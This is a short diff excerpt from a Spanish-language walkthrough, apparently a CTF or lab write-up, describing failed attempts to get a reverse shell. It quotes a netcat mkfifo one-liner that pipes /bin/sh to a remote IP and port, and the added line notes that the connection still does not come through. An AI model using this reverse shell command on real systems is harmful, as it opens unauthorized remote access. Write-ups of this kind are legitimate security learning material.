@@ -101,3 +101,5 @@ Y segundo, lanzamos la reverse shell, pero en este caso, nos da error debido a q
 Probamos otra opción, que es hacer uso de netcat pero sin la opción -e.
 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+
+Y tampoco llega a producirse la conexión.
